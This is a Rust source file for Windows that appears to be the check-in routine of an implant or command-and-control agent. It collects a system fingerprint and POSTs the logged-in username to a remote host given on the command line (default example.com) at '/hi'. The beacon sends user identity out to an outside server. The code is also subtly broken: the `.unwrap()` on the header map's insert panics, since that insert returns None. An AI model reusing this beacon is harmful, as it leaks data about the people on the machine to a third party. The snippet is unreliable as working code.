mod collector;
mod comms;

use std::collections::HashMap;

use collector::SystemFingerprint;
use comms::Communicator;
use comms::client::Request;
use windows::core::{Error, Result};

pub fn hello() -> Result<()> {
    let fingerprint = SystemFingerprint::collect()?;
    let mut comm = Communicator::new()?;

    let args = std::env::args()
        .nth(1)
        .unwrap_or_else(|| String::from("example.com:443"));
    let home: Vec<&str> = args.split(":").collect();

    let hostname = home[0];
    let port: u16 = home[1].parse().unwrap();

    let mut headers: HashMap<String, String> = HashMap::new();
    headers
        .insert("Content-Type".to_string(), "text/plain".to_string())
        .unwrap();

    let body = fingerprint
        .user
        .username
        .unwrap_or("Unknown username".to_string());
    let body = body.as_str();

    let request = Request::new(hostname, port, "POST", "/hi", Some(headers), Some(body));

    let response = comm.request(request)?;

    println!("Response code [main func]: {}", response.code);
    println!(
        "Response [main func]: {}",
        response.body.unwrap_or("Empty response body".to_string())
    );

    Ok(())
}
